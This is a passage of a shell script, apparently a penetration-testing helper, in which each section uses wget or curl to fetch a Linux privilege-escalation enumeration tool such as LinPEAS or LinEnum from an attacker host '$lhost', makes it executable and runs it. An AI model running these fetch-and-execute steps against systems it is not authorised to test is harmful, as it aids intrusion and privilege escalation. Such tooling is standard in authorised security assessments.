...
##### LinEnum Section #######
   cd curdir
   wget http://"$lhost":80/script/LinEnum.sh
...
##### LinPEAS Section #######
   cd $(pwd)
   wget http://"$lhost":80/script/linpeas.sh
...
##### Linux Exploit Suggester Section #######
   cd $(pwd)
   wget http://"$lhost":80/script/linux-exploit-suggester-2.pl
...
##### Linux Privchecker Section #######
   cd $(pwd)
   wget http://"$lhost":80/script/linuxprivchecker.py
...
##### Linux Lse Section #######
   cd $(pwd)
   wget http://"$lhost":80/script/lse.sh
   chmod 700 lse.sh
   ./lse.sh > lse.txt  2>&1
###############################
...
##### Linux Unix Privesc Section #######
   cd $(pwd)
   wget http://"$lhost":80/script/unix-privesc-check.sh
...
##### LinEnum Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/script/LinEnum.sh
   chmod 700 LinEnum.sh
   ./LinEnum.sh > LinEnum.txt  2>&1
#############################
...
##### LinPEAS Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/script/linpeas.sh
   chmod 700 linpeas.sh
   ./linpeas.sh > linpeas.txt  2>&1
#############################
...
##### Linux Exploit Suggester Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/script/linux-exploit.suggester-2.pl
   chmod 700 linux-exploit.suggester-2.pl
   ./linux-exploit.suggester-2.pl > linux-exploit-suggester-2.txt  2>&1
#############################
...
##### Linux Privchecker Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/script/linuxprivchecker.py
   chmod 700 linuxprivchecker.py
   ./linuxprivchecker.py > linuxprivchecker.txt  2>&1
#######################################
...
##### Linux Lse Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/script/lse.sh
   chmod 700 lse.sh
   ./lse.sh > lse.txt  2>&1
###############################
...
##### Linux Unix Privesc Section #######
   cd $(pwd)
   curl -OL http://"$lhost":80/script/unix-privesc-check.sh
   chmod 700 unix-privesc-check.sh
   ./unix-privesc-check.sh > unix-privesc-check.txt  2>&1
########################################
   set +x
